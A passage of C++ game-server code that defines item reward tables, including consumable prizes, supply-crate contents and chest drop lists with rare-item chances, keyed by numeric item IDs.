		if (i == 242) items[i].consume_prize.push_back(1212);
		if (i == 2972) items[i].consume_prize.push_back(4182);
		if (i == 3014 || i == 3012 || i == 2914) items[i].consume_prize.push_back(4246);
		if (i == 1460) items[i].consume_prize.push_back(1970);

		if (i == 9866) items[i].consume_prize.push_back(9862);
		if (i == 9868) items[i].consume_prize.push_back(9864);
		if (i == 2392) items[i].consume_prize.push_back(9114);
		if (i == 3218) items[i].consume_prize.push_back(3098);
		if (i == 3020) items[i].consume_prize.push_back(3098);
		if (i == 3792) items[i].consume_prize.push_back(5244);
		if (i == 10634) items[i].consume_prize.push_back(11318);
		if (i == 1198) items[i].consume_prize.push_back(5256);
		if (i == 8468) items[i].consume_prize.push_back(10232);
		if (i == 2984) items[i].consume_prize.push_back(3118);
		if (i == 4360) items[i].consume_prize.push_back(10194);
		if (i == 5754) items[i].consume_prize.push_back(8530); //black devil
		if (i == 8428) items[i].consume_prize.push_back(9488); //kitsune mask
		if (i == 10828 || i == 10830 || i == 10832 || i == 6808 || i == 6810 || i == 6812 || i == 7218 || i == 7220 || i == 7222 || i == 10528 || i == 10530 || i == 10532 || i == 414 || i == 416 || i == 418 || i == 420 || i == 422 || i == 424 || i == 426 || i == 4634 || i == 4636 || i == 4638 || i == 4640 || i == 4642 || i == 5370 || i == 5726 || i == 5728 || i == 5730 || i == 6030 || i == 6032 || i == 6034) items[i].consume_prize.push_back(4192);
		if (i == 5012 || i == 1018 || i == 592) items[i].consume_prize.push_back(1178);
		if (i == 10406) items[i].consume_prize.push_back(11316);
		if (i == 882) items[i].consume_prize.push_back(1232);
		if (i == 1934) items[i].consume_prize.push_back(3124);
		if (i == 10626) items[i].consume_prize.push_back(11312);
		if (i == 6160) items[i].consume_prize.push_back(9040);
		if (i == 3794) items[i].consume_prize.push_back(10190);
		if (i == 8018) items[i].consume_prize.push_back(9034);
		if (i == 2390) items[i].consume_prize.push_back(3122);
		if (i == 5246) items[i].consume_prize.push_back(9050);
		if (i == 6798) items[i].consume_prize.push_back(7126);
		if (i == 9722 || i == 9724) items[i].consume_prize.push_back(10200);
		if (i == 9388) items[i].consume_prize.push_back(10234);
		if (i == 4732) items[i].consume_prize.push_back(7124);
		if (i == 10804) items[i].consume_prize.push_back(11320);
		if (i == 5000 || i == 5112 || i == 5654 || i == 6854 || i == 7644 || i == 10286 || i == 934 || i == 946 || i == 984 || i == 1364 || i == 1490 || i == 1750 || i == 2046 || i == 2248 || i == 2744 || i == 3252 || i == 3446 || i == 3534 || i == 3694 || i == 3832 || i == 4242 || i == 4486 || i == 4776 || i == 4892) items[i].consume_prize.push_back(1210);

		//supply crates
		if (i == 8522) items[i].noob_item = { { 2734, 25 }, { 4752,2 }, { 8512, 1 }, { 9680, 1 } };
		if (i == 10836) items[i].noob_item = { { 8558, 5 }, { 4296, 1 }, { 1258, 5 }, { 1260, 5 }, { 1262, 5 }, { 1264, 5 }, { 1266, 5 }, { 1268, 5 }, { 1270, 5 }, { 4318, 5 }, { 4312, 5 }, { 4308, 5 }, { 4314, 5 }, { 4310, 5 }, { 4316, 5} };
		if (i == 10838) items[i].noob_item = { { 2914, 25}, { 3012, 15}, { 3014, 10}, { 3016, 5}, { 3018, 2}, { 3020, 1} };
		if (i == 10840) items[i].noob_item = { {10854 , 1}, { 10852 , 1}, { 10850 , 1}, { 10848 , 1}, { 10846 , 1}, { 10844, 1}, { 956 , 1}, {3468, 1}, { 4564, 1}, { 3836, 1}, { 676, 1}, { 874, 1}, { 4562, 1}, { 868, 1}, { 196, 1}, { 4580, 1}, { 4586, 1}, { 962, 1}, { 540, 1}, { 3428, 1}, { 3472, 1}, { 4588, 1}, { 4602,1} };
		if (i == 10834) items[i].noob_item = { {6520, 2}, {6538, 2}, {6522, 2}, {6528, 2}, {6540, 2}, {6518, 2}, {6530, 2}, {6524, 2}, {6536, 2}, {6534, 2}, {6532, 2}, {6526, 2} };
		if (i == 10842) items[i].noob_item = { {2382, 1}, { 2300, 1}, { 2298, 1}, { 2296, 1}, { 2294, 1}, { 2292, 1}, { 2316, 1}, { 2314, 1}, { 2312, 1}, { 2310, 1}, { 2308, 1}, { 2328, 1}, { 2326, 1}, { 2324, 1}, { 2322, 1}, { 2320, 1}, { 2332, 1}, { 2334, 1}, { 2336, 1}, { 2338, 1}, { 2340,1} };
		if (i == 12678) items[i].noob_item = { { 12660, 100 }, { 12662, 100 }, { 12664, 100 }, { 12666, 100 }, { 12668,100 }, { 12670, 50}, { 12672, 50 }, { 12674,10 }, { 12676, 10 } };
		// growmoji chest
		if (i == 11156) items[i].randomitem = { 6278,6744,6824,6894,7370,7474,7656,7684,7932,8028 };
		if (i == 7628) items[i].randomitem = { 7764, 7592, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590, 7590 };

		if (i == 13160) {
			items[i].randomitem = {  13218, 13212, 13214, 13216, 13202, 13204, 13206, 13170, 13174, 13234, 13238, 13222, 13226, 13224, 13254, 13244, 13252, 13250, 13182, 13198, 13178 ,13180, 13256 };

		}
		// geiger_prizes
		if (i == 2204) items[i].randomitem = { 6416,3196,2206,1500,1498,2806,2804,8270,8272,8274,2244,2246,2242,3792,3306,4676,4678,4680,4682,4652,4650,4648,4646,11186,10086, 6416,3196,2206,1500,1498,2806,2804,8270,8272,8274,2244,2246,2242,3792,3306,4676,4678,4680,4682,4652,4650,4648,4646,11186,10086, 6416,3196,2206,1500,1498,2806,2804,8270,8272,8274,2244,2246,2242,3792,3306,4676,4678,4680,4682,4652,4650,4648,4646,11186,10086, 2248,2250,3792,10084, 12502, 4654 , 9380 , 11562 };

		if (i == 2558) items[i].randomitem = { 2552, 9460, 2548, 2546, 2544, 2550, 10766,2552, 9460, 2548, 2546, 2544, 2550, 10766,2552, 9460, 2548, 2546, 2544, 2550, 10766,2552, 9460, 2548, 2546, 2544, 2550, 10766,2552, 9460, 2548, 2546, 2544, 2550, 10766, 2554 };

		//just consumables
		if (i == 1360) {
			items[i].noob_item = { { 3566,1},{ 12,1},{ 56,1},{ 16,1},{ 380,1},{ 1138,1},{ 20,1},{ 100,1},{ 378,1},{ 116,1},{ 370,1},{ 26,1},{ 22,1},{ 580,1},{ 194,1},{ 104,1},{ 190,1},{ 376,1},{ 1306,1},{ 696,1},{ 880,1},{ 166,1},{ 184,1},{ 1322,1},{ 164,1},{ 3578,1},{ 3782,1},{ 368,1},{ 24,1},{ 170,1},{ 372,1},{ 374,1},{ 52,1},{ 102,1},{ 178,1},{ 42,1},{ 68,1},{ 40,1},{ 28,1},{ 248,1},{ 176,1},{ 130,1},{ 270,1},{ 1324,1},{ 236,1},{ 142,1},{ 336,1},{ 694,1},{ 10034,1},{ 140,1},{ 76,1},{ 48,1},{ 188,1},{ 44,1},{ 34,1},{ 168,1},{ 54,1},{ 222,1},{ 174,1},{ 884,1},{ 118,1},{ 3572,1},{ 198,1},{ 548,1},{ 36,1},{ 680,1},{ 654,1},{ 122,1},{ 238,1},{ 106,1},{ 66,1},{ 38,1},{ 90,1},{ 208,1},{ 162,1},{ 30,1},{ 272,1},{ 670,1},{ 888,1},{ 144,1},{ 886,1},{ 192,1},{ 126,1},{ 1432,1},{ 2938,1},{ 172,1},{ 7630,1},{ 412,1},{ 3570,1},{ 3568,1},{ 2808,1},{ 354,1},{ 138,1},{ 9392,1},{ 214,1},{ 11202,1},{ 224,1},{ 342,1},{ 1846,1},{ 110,1},{ 108,1},{ 210,1},{ 234,1},{ 200,1},{ 58,1},{ 11202,1 } };
			items[i].newdropchance = 0;
		}
		if (i == 1680) {//sfw
			items[i].noob_item = { {12176, 1}, { 8616,1},{ 8618,1},{ 1676,1},{ 8590,1},{ 9732,1},{ 2868,1},{ 4822,1},{ 1668,1},{ 11046,1},{ 1678,1},{ 1664,1},{ 844,1},{ 2864,1},{ 3764,1},{ 6308,1},{ 6310,1},{ 6306,1},{ 6322,1},{ 1670,1},{ 4816,1},{ 4818,1},{ 2870,1},{ 2872,1},{ 2874,1},{ 2802,1},{ 1666,1},{ 4814,1 } };
			items[i].rare_item = { {12352, 1} , { 8588,1},{ 9730,1},{ 11008,1 },{12186,1}, {12180, 1}, {12176, 1}, {13572,1},{13616,1} };
			items[i].newdropchance = 4000;
		}
		if (i == 11036) {
			items[i].noob_item = { { 11024,1},{11022,1},{11032,3},{11034,3 } };
			items[i].rare_item = { { 11030,1},{ 10922,1},{ 11026,1},{ 11028,1 } };
			items[i].newdropchance = 40;
		}
		if (i == 12830) {
			items[i].noob_item = { { 12800,1},{12804,1},{12812,1},{12818,1 },{12822,1 } };
			items[i].rare_item = { { 12798,1},{ 12796,1},{ 12404,1},{ 12820,1 },{ 12412,1 } };
			items[i].newdropchance = 40;
		}
		if (i == 12832) {
			items[i].noob_item = { { 12800,1},{12804,1},{12812,1},{12818,1 },{12822,1 } };
			items[i].rare_item = { { 12798,1},{ 12796,1},{ 12404,1},{ 12820,1 },{ 12412,1 },{ 12798,1},{ 12796,1},{ 12404,1},{ 12820,1 },{ 12412,1 }, { 12798,1},{ 12796,1},{ 12404,1},{ 12820,1 },{ 12412,1 }, {12406,1} };
			items[i].newdropchance = 40;
		}
		if (i == 9680) {
			items[i].noob_item = { { 9662,2},{9666,1},{9664,4},{10912,1 } , {9668,8} , {8570,8} , {9658,2} };
			items[i].rare_item = { { 2738,1},{ 10906,1},{ 10892,1},{ 9670,1 },{ 2760,1 },{ 4772,1 },{ 3624,1 },{ 2752,1 },{ 11988,1 },{ 9650,1 },{ 9652,1 },{ 8514,1 },{ 9654,1 } };
			items[i].newdropchance = 250;
		}
		if (i == 10386) {
			items[i].noob_item = { { 11330,1},{1988,1},{1208,1},{11348,1 },{1992,1},{5256,1},{1222,1} ,{11342,1} ,{1198,1} ,{1982,1} ,{1200,1} ,{4160,1} ,{1220,1} ,{10198,1} ,{5240,1} ,{1202,1} ,{1238,1} ,{5238,1} ,{4162,1} ,{10316,1} ,{10196,1} ,{7116,1} ,{9044,1} ,{1168,1} ,{3116,1} ,{4164,1} ,{1172,1} ,{1230,1} ,{1192,1} ,{11340,1} ,{1194,1} ,{10202,1} ,{1226,1} ,{7108,1} ,{1196,1} ,{9046,1},{1980,1},{1972,1},{7110,1},{1182,1},{1994,1},{1184,1},{1186,1},{1188,1},{11330,1},{10204,1},{5222,1},{3102,1},{4154,1},{5232,1},{5224,1} };
			items[i].rare_item = { { 10326,1},{ 10322,1},{ 10324,1} };
			items[i].newdropchance = 350;
		}
		if (i == 11860) {
			items[i].noob_item = { { 11858,10},{ 11852,10},{ 11854,10},{ 11856,10},{ 11850,10},{11844,10},{11846,10},{11848,10},{11858,10},{ 11852,10},{ 11854,10},{ 11856,10},{ 11850,10},{11844,10},{11846,10},{11848,10},{11842,1},{11836,1},{11838,1},{11840,1},{11868,1},{11862,1},{11864,1},{11866,1 } };
			items[i].rare_item = { { 11826,1},{ 11820,1},{11822,1},{11824,1},{11834,1},{11828,1},{11830,1},{11832,1},{ 11818,1 } };
			items[i].newdropchance = 150;
		}
		if (i == 7346) {
			items[i].noob_item = { { 7362,5},{ 7364,5},{9126,5},{11374,5},{9128,5},{7358,5},{7354,5},{7360,5},{7352,5},{7356,5},{10256,5},{11376,5},{10282,5},{9134,5},{7348,5},{10268,5},{9130,5},{11370,5},{7342,5},{5294,5},{11354,5},{9132,5},{5298,5},{5288,5},{5292,5 } };
			items[i].newdropchance = 0;
		}
		if (i == 9286) {
			items[i].noob_item = { { 5768,1},{5766,1},{5744,1},{11628,1},{10664,1},{10596,1},{7698,1},{9282,1},{9280,1},{11656,1},{10592,1},{10590,1},{9290,1},{5758,1},{5756,1},{5760,1},{5762,1},{10598,1},{9284,1},{10582,1},{11632,1},{11634,1} };
			items[i].rare_item = { {13064,1}, {13068,1}, {13066,1}, {13084,1},{13078,1}, { 5754,1},{7696,1},{9272,1},{10576,1},{10578,1},{11622,1} };
			items[i].newdropchance = 50;
		}
		if (i == 5750) {
			items[i].noob_item = { {13090,1},{13086,1},{13098,1},{ 202,1},{204,1},{206,1},{5766,1},{5768,1},{5744,1},{7688,1},{7690,1},{7694,1},{7686,1},{7692,1 } };
			items[i].rare_item = { { 9286,1},{9286,1},{9286,1},{4994,1},{ 2978,1},{ 5766,1},{ 5768,1},{5756,1},{5758,1},{5760,1},{5762,1},{5754,1},{7698,1},{7696,1},{9286,1},{9272,1},{9286,1},{9286,1},{9286,1 } };
			items[i].newdropchance = 1500;
		}
		if (i == 13054) {
			items[i].noob_item = { {13090,5}, {13082,1}, {13096,1},{13088,1},{13100,3},{13092,5},{13072,1},{13086,1}, {13094,1} };
			items[i].rare_item = { {13062,1}, {13070,1}, { 13064,1} };
			items[i].newdropchance = 200;
		}
		if (i == 2306) {
			items[i].noob_item = { {13036,1},{13048,1},{13028,1}, { 10560,1},{10558,1},{10546,1},{1408,1},{1410,1},{1412,1},{1414,1},{1416,1},{1418,1},{2280,1},{2290,1},{2288,1},{3274,1},{4372,1},{4378,1},{4370,1},{4366,1},{5504,1},{5508,1},{5512,1},{5490,1},{5514,1},{5496,1},{9242,1},{9244,1},{9246,1},{9248,1},{9258,1},{9260,1},{11584,1 } };
			items[i].rare_item = { {13044,1},{13046,1},{12994,1}, { 7672,1},{10526,1 } };
			items[i].newdropchance = 40;
		}
		if (i == 7672) {
			items[i].noob_item = { {13000, 1},  { 7668,2},{7666,5},{7662,3},{11574,3},{11572,1},{7664,3},{10568,1},{1406,1 } };
			items[i].rare_item = { {13030,1}, {12996,1}, {13002,1}, { 9256,1},{ 11544,1},{ 10492,1},{ 9262,1},{ 7660,1},{ 10494,1},{ 11534,1},{ 10534,1 } };
			items[i].newdropchance = 20;
		}
		if (i == 11476) { // Black Friday Black Box Xtreme
			items[i].noob_item = { { 12860,1},{ 12858,1},{ 12864,1},{12862,1} ,{ 10334,1},{ 10330,1},{ 10336,1},{10338,1},{ 10332,1},{ 11384,1},{ 11386,1},{ 11382,1},{ 11380,1},{ 11378,1 } , { 10334,1},{ 10330,1},{ 10336,1},{10338,1},{ 10332,1},{ 11384,1},{ 11386,1},{ 11382,1},{ 11380,1},{ 11378,1 } };
			items[i].rare_item = { {10332,1}, {12856,1} };
			items[i].newdropchance = 50;
		}
		if (i == 10396) {
			items[i].noob_item = { { 12968,1 }, { 12962,1 }, { 12970,1 }, { 12964,1 }, { 12966,1 }, { 12960,5 }, { 10340,1 }, { 10342,1 }, { 10344,1 }, { 10346,1 }, { 10348,1 }, { 10330,1 }, { 10332,1 }, { 10334,1 }, { 10336,1 }, { 10338,1 }, { 11380,1 }, { 11476,1 }, { 11378,1 }, { 11382,1 }, { 11394,1 }, { 11384,1 }, { 11386,1 }, { 11392,1 }, { 1388,1 } };
			items[i].rare_item = { {11476,1} };
			items[i].newdropchance = 50;
		}
		if (i == 5404) {
			items[i].noob_item = { {5398,1} , {12882,1 }, {12888,1}, {5420,1}, {5436,1}, {5438,1}, {5540,1}, {5426,1}, {5444,1}, {7400,1} };
			items[i].rare_item = { {5424,1} , {5422,1}, {5456,1}, {7398,1}, {7414,1}, {7396,1}, {9194,1}, {9172,1} };
			items[i].newdropchance = 25;
		}
		if (i == 5402) {
			items[i].noob_item = { {12928,1},{13016,1},{12932,1},{12926,1},{12930,1},{12922,1}, {12938, 5}, { 5394,1 }, { 9180,1 }, { 5474,1 }, { 5384,1 }, { 7458,1 }, { 1778,1 }, { 5348,1 }, { 5350,1 }, { 5352,1 }, { 5354,1 }, { 5476,1 }, { 228,1 }, { 5472,1 }, { 7454,1 }, { 9196,1 }, { 5364,1 }, { 5386,1 }, { 5358,1 }, { 5360,1 }, { 5362,1 }, { 7436,1 }, { 5400,1 }, { 5478,1 }, { 5370,1 }, { 5368,1 }, { 5396,1 }, { 5470,1 }, { 7438,1 }, { 3204,1 }, { 5372,1 }, { 7446,1 }, { 7448,1 } };
			items[i].rare_item = { {5404,1} };
			items[i].newdropchance = 120;
		}
		if (i == 11758) {
			items[i].noob_item = { {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1} };
			items[i].rare_item = { {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1}, {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1}, {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1}, {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1}, {11756,3},{10778,1},{10782,1},{10774,1},{10784,1},{10780,1},{10776,1},{10786,1},{10758,1},{10754,1},{10394,1}, {10748,1}, {11884, 1}, {11768,1}, {11760,1}, {8944,1}, {1970,1}, {11118,1}, {1460,1}, {9036,1}, {9758,1}, {10026,1}, {8284,1}, {10388,1}, {11318,1}, {10252,1}, {5754,1}, {9446,1}, {1458,1}, {4664,1}
			};
			items[i].newdropchance = 99999;
		}
		if (i == 11756) {
			items[i].noob_item = { {9522,5},{9526,1}, {10842,1},{10834,1}, {10840,1}, {10394, 1}, {10784,1},{10838,1},{10836,1},{10782,1}, {10786,1}, {10776,1}, {11782,2}, {11778,2},{11780,2} };
			items[i].rare_item = { {10778,1},{11758,1}, {10780, 1} };
			items[i].newdropchance = 1000;
		}
		if (i == 10536) {//Special Winter Wish
			items[i].noob_item = { {7414,1}, {5404, 1}, {11454, 1}, {9194, 1}, {5426, 1}, {11480, 1}, {7398, 1}, {10404, 1}, {5422, 1}, {7406, 1}, {5424, 1}, {13014, 1}, {12884, 1} };
			items[i].rare_item = { {11466,1},{10498,1}, {10412, 1}, {10410, 1}, {10424, 1}, {11478, 1} };
			items[i].newdropchance = 2150;
		}
		if (i == 12566) {//garuda chest
			items[i].noob_item = { {12592,5}, {12594, 5}, {12572, 5}, {12570, 5}, {12588, 5}, {12590, 1}, {12574, 1}, {12586, 1} };
			items[i].rare_item = { {12584,1},{12428,1}, {12426, 1}, {12424, 1}, {12422, 1}, {12582, 1}, {12422, 1}, {12580, 1}, {12578, 1}, {12576, 1} };
			items[i].newdropchance = 1200;
		}
		if (i == 12568) {//garuda golden chest
			items[i].noob_item = { {12580, 1}, {12578, 1}, {12576, 1}, {12582,1} };
			items[i].rare_item = { {12354,1},{12356,1}, {12422, 1}, {12424, 1}, {12426, 1}, {12428, 1}, {12374, 1} };
			items[i].newdropchance = 2000;
		}
		/*
		if (i == 9018) {//dark ticket
			items[i].noob_item = { {9026, 5}, {9028, 5}, {9024, 5}, {9030, 5}, {11346, 1} };
			items[i].rare_item = { {10210, 1}, {9058, 1}, {11328, 1}, {11344, 1}, {9036, 1}, {11324, 1}, {9032, 1}, {9038, 1}, {7098, 1} };
			items[i].newdropchance = 500;
		}*/
		if (i == 11398) {//Alien Landing POD
			items[i].noob_item = { {12972,1},{12974,1},{12978,1},{12980,1}, {10990, 1}, {11000, 1}, {11410, 1}, {11426, 1}, {10996, 1}, {11408, 1}, {11448, 1}, {11450, 1}, {11452, 1}, {11412, 1}, {11414, 2}, {10998, 1}, {11422, 5}, {10994, 1} };
			items[i].rare_item = { {10952, 1}, {10954, 1}, {10956, 1}, {10958, 1}, {10960, 1}, {} };
			items[i].newdropchance = 500;
		}
		if (i == 8410) {//Mutant food
			items[i].noob_item = { {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5}, {8368, 1},{8812, 1}, {8810, 1}, {8334, 5}, {8794, 1}, {8330, 1}, {8796, 5} };
			items[i].rare_item = { {8372, 1}, {8358, 1}, {8422, 1}, {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5} };
			items[i].newdropchance = 3000;
		}

		if (i == 8408) {//Mutant food
			items[i].noob_item = { {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5}, {8368, 1},{8812, 1}, {8810, 1}, {8334, 5}, {8794, 1}, {8330, 1}, {8796, 5} };
			items[i].rare_item = { {8372, 1}, {8358, 1}, {8422, 1}, {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5} };
			items[i].newdropchance = 3000;
		}

		if (i == 8414) {//Mutant food
			items[i].noob_item = { {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5}, {8368, 1},{8812, 1}, {8810, 1}, {8334, 5}, {8794, 1}, {8330, 1}, {8796, 5} };
			items[i].rare_item = { {8372, 1}, {8358, 1}, {8422, 1}, {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5} };
			items[i].newdropchance = 3000;
		}

		if (i == 8412) {//Mutant food
			items[i].noob_item = { {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5}, {8368, 1},{8812, 1}, {8810, 1}, {8334, 5}, {8794, 1}, {8330, 1}, {8796, 5} };
			items[i].rare_item = { {8372, 1}, {8358, 1}, {8422, 1}, {8332, 1}, {8798, 5}, {8814, 1}, {8348, 1}, {8346, 1}, {8350, 1}, {8804, 1}, {8806, 1}, {8808, 1}, {8340, 5}, {8342, 5}, {8800, 5}, {8802, 5} };
			items[i].newdropchance = 3000;
		}
		if (i == 7954) {//spring chest
			items[i].noob_item = { {7930, 1}, {7928, 1}, {7926, 1}, {7924, 1}, {7922, 1}, {7920, 1}, {7918, 1}, {7906, 1}, {7904, 1}, {7902, 1}, {7900, 1}, {7898, 1}, {7896, 1}, {7894, 1}, {7892, 1}, {7890, 1}, {7888, 3}, {7886, 1}, {7884, 1}, {7882, 1}, {7880, 1}, {7878, 1}, {7876, 1}, {7874, 1}, {7872, 1}, {7870, 1}, {7868, 1}, {7866, 1}, {7864, 1}, {7862, 1}, {7860, 1}, {7858, 1}, {7856, 1}, {7854, 1}, {7852, 1}, {7850, 1}, {7848, 1}, {7846, 1}, {7290, 5} };
			items[i].rare_item = { {7916, 1}, {7914, 1}, {7912, 1}, {7910, 1}, {7908, 1} };
			items[i].newdropchance = 500;
		}

		if (i == 7484) {//winter chest
			items[i].noob_item = { {7292, 1}, {7230, 5}, {7226, 5}, {7248, 1}, {7282, 1}, {7294, 1}, {7268, 1}, {7236, 5}, {7238, 5}, {7324, 5}, {7326, 5}, {7284, 5}, {7218, 5}, {7296, 1}, {7274, 5}, {7290, 5}, {7270, 5}, {7224, 5}, {7272, 5}, {7320, 5}, {7322, 5}, {7246, 1}, {7266, 1}, {7264, 1}, {7262, 1}, {7302, 1}, {7240, 5}, {7486, 5}, {7228, 5}, {7242, 5}, {7244, 5}, {7288, 5} };
			items[i].rare_item = { {7304, 1}, {7260, 1}, {7298, 1}, {7278, 1}, {7280, 1}, {7276, 1}, {7250, 1}, {7252, 1}, {7254, 1}, {7256, 1}, {7300, 1}, {7258, 1} };
			items[i].newdropchance = 500;
		}

		if (i == 5948) {//Gold guild chest
			items[i].noob_item = { {6216, 1}, {6218, 1}, {6220, 1}, {6222, 1}, {6224, 5}, {6282, 1}, {6188, 1}, {6190, 1}, {6192, 1}, {6158, 1}, {6160, 1}, {6168, 5}, {6178, 5}, {6180, 5}, {6182, 5}, {6184, 5}, {6186, 5} };
			items[i].rare_item = { {6008, 1}, {6196, 1}, {6284, 1}, {6006, 1}, {6004, 1}, {6224, 5},{6190, 1},{6190, 1},{6188, 1}, {6282, 1},{6222, 1},{6180, 5}, {6004, 1}, {6196, 1}, {6284, 1}, {6006, 1}, {6004, 1}, {6196, 1}, {6284, 1}, {6006, 1}, {6004, 1} };
			items[i].newdropchance = 5500;
		}


		if (i == 12262) {//pearl chest
			items[i].noob_item = { {12216, 1} , {12218, 1}, {12220, 5}, {12222, 5}, {13590,5},{13586,5},{13588,5} };
			items[i].rare_item = { {12174, 1}, {13594,1}, {13576,1},{13584,1},{13582,1},{13576,1},{13594,1}, {12212, 1}, {12182,1}, {12208, 1}, {12210, 1}, {12214, 1}, {12562,1 }, {12560,1}, {12558,1}, {12556,1}, {12554,1}, {12552,1}, {12550,1}, {12548,1}, {12546,1} };
			items[i].newdropchance = 25;
		}

		if (i == 13598) {//pearl chest
			items[i].noob_item = { {13586, 2}, {13588, 2}, {13590, 2}, {12220, 2}, {12222, 2} };
			items[i].rare_item = { {13584, 1} };
			items[i].newdropchance = 25;
		}

		if (i == 11402) {// rubble chest
			items[i].noob_item = { {776, 5} , {776, 10}, {10950,1}, {1062,1}, {1778,5},{5764,1}, {10394,1}, {726,5} };
			items[i].rare_item = { {778, 1}, {10946,1} , {1486,1} };
			items[i].newdropchance = 150;
		}

		if (i == 11404) {//golden rubble chest
			items[i].noob_item = { {776, 20}, {776, 25}, {10950,1}, {1062,1} , {1778,5} ,{5764,1} ,{5138,1}, {726,5} };
			items[i].rare_item = { {10944, 1} , {10946,1} , {1486,1} };
			items[i].newdropchance = 150;
		}

		if (i == 12264) {//golden pearl chest
			items[i].noob_item = { {12216, 1} , {12218, 1}, {12208, 1},{13594,1},{13582,1},{13576,1},{13584,1}, {12210, 1}, {12214, 1}, {12562,1 }, {12560,1}, {12558,1}, {12556,1} , {12554,1} , {12552,1} , {12550,1} , {12548,1}, {12546,1} };
			items[i].rare_item = { {12184, 1}, {13578,1}, {13580,1}, {12174, 1}, {12182, 1}, {12268,1},{12184, 1}, {12174, 1}, {12182, 1}, {12268,1}, {12242,1} };
			items[i].newdropchance = 250;
		}
		if (i == 12044) {//starfleet cadet
			items[i].noob_item = { {12146, 10}, {12062, 1}, {12064, 1}, {12066, 1}, {12070, 1}, {12136, 1}, {12072, 1}, {12074, 1}, {12076, 1}, {12078, 1}, {12112, 1}, {12114, 1}, {12116, 1}, {12118, 1}, {12088, 1}, {12090, 1}, {12092, 1}, {12094, 1}, {12096, 1}, {12058, 1}, {12060, 1}, {12080, 1}, {12082, 1}, {12084, 1}, {12086, 1}, {12120, 1}, {12122, 1}, {12150, 1}, {12138, 1}, {12140, 1}, {12142, 1}, {12144, 1}, {12124, 1}, {12126, 1}, {12128, 1}, {12130, 1}, {12132, 1}, {12098, 1}, {12100, 1}, {12102, 1}, {12104, 1}, {12106, 1}, {12318, 1}, {12320, 1}, {12322, 1}, {12324, 1}, {12326, 1}, {12328, 1}, {12330, 1} };
			items[i].rare_item = { {12146, 10}, {12062, 1}, {12064, 1} };
			items[i].newdropchance = 2500;
		}
		if (i == 12046) {//starfleet officer
			items[i].noob_item = { {12146, 10}, {12062, 1}, {12064, 1}, {12066, 1}, {12070, 1}, {12136, 1}, {12072, 1}, {12074, 1}, {12076, 1}, {12078, 1}, {12112, 1}, {12114, 1}, {12116, 1}, {12118, 1}, {12088, 1}, {12090, 1}, {12092, 1}, {12094, 1}, {12096, 1}, {12058, 1}, {12060, 1}, {12080, 1}, {12082, 1}, {12084, 1}, {12086, 1}, {12120, 1}, {12122, 1}, {12150, 1}, {12138, 1}, {12140, 1}, {12142, 1}, {12144, 1}, {12124, 1}, {12126, 1}, {12128, 1}, {12130, 1}, {12132, 1}, {12098, 1}, {12100, 1}, {12102, 1}, {12104, 1}, {12106, 1}, {12318, 1}, {12320, 1}, {12322, 1}, {12324, 1}, {12326, 1}, {12328, 1}, {12330, 1} };
			items[i].rare_item = { {12014, 1}, {12016, 1}, {12018, 1}, {12020, 1}, {12024, 1}, {12134, 1}, {12054, 1} };
			items[i].newdropchance = 1500;
		}
		if (i == 10538) {//winter wish
			items[i].noob_item = { { 5394,1 }, { 9180,1 }, { 5474,1 }, { 5384,1 }, { 7458,1 }, { 1778,1 }, { 5348,1 }, { 5350,1 }, { 5352,1 }, { 5354,1 }, { 5476,1 }, { 228,1 }, { 5472,1 }, { 7454,1 }, { 9196,1 }, { 5364,1 }, { 5386,1 }, { 5358,1 }, { 5360,1 }, { 5362,1 }, { 7436,1 }, { 5400,1 }, { 5478,1 }, { 5370,1 }, { 5368,1 }, { 5396,1 }, { 5470,1 }, { 7438,1 }, { 3204,1 }, { 5372,1 }, { 7446,1 }, { 7448,1 } };
			items[i].rare_item = { {12936, 1}, {13018,1}, {12934,1 }, {5404,1}, {10420,1}, {10422,1}, {11496,1}, {11498,1}, {11538,1} };
			items[i].newdropchance = 750;
		}
		if (i == 10536) {//special winter wish
			items[i].noob_item = { { 7414,1 }, { 5404,1 }, { 5474,1 }, { 11454,1 }, { 9194,1 }, { 5426,1 }, { 11480,1 }, { 7398,1 }, { 10404,1 }, { 5422,1 }, { 7406,1 }, { 5424,1 }, { 10538,3 } };
			items[i].rare_item = { {11466,1}, {10498,1}, {10412,1}, {10410,1}, {10424,1}, {11478,1} };
			items[i].newdropchance = 750;
		}

		if (i == 13317) {
			items[i].noob_item = { {13290, 10} , {13292, 10} , {13298, 10} , {13300, 10}, {13286,10},{13296,10},{13288,10},{13308,5},{13304,5},{13302,5},{13306,5}};
